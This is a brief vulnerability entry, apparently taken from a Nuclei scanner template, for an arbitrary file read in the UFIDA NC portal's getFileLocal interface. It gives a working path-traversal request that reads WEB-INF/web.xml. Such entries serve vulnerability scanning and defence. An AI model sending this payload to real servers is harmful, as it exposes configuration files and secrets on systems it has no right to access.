# Vulnerability: UFIDA NC Portal - Arbitrary File Read
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`yonyou-ufida-nc-lfi.yaml`)

## Description
There is any file reading in the getFileLocal interface of UFIDA Mobile System Management.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml
```

